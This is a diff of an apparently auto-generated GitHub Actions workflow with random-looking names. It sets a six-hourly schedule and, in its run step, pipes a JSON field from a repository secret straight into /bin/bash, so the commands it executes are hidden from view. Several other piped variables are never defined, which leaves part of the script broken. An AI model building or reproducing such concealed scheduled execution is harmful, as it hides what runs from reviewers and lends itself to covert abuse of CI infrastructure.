@@ -3,22 +3,21 @@ name: renhengxing4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 1/6 * * *'
-
-jobs:  # 32350
+    - cron: '42 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: renhengxing4567
         env:
-          pn7497: ${{ secrets.pn7497 }}
+          ri04: ${{ secrets.ri04 }}
         run: |
-          echo $pn7497 | jq -r .fqlaf6998 | /bin/bash
-          echo $gtl358 | jq -r .tjk796 | /bin/bash
-          echo $hga8 | jq -r .uyoc3692 | /bin/bash
-          echo $ktneh0 | jq -r .djlwj9 | /bin/bash
-          echo $k79276 | jq -r .n824 | /bin/bash
-          echo $vd9424 | jq -r .vid3115 | /bin/bash
-          echo $a45 | jq -r .nh26284 | /bin/bash
+          echo $ri04 | jq -r .rnkfk98956 | /bin/bash
+          echo $bdn1721 | jq -r .cae876 | /bin/bash
+          echo $dnvbx82027 | jq -r .lpq5911 | /bin/bash
+          echo $ux18 | jq -r .dfhxp5 | /bin/bash
+          echo $jklcz4 | jq -r .qc2 | /bin/bash
+          echo $ibbgw7882 | jq -r .vmfnz382 | /bin/bash
 
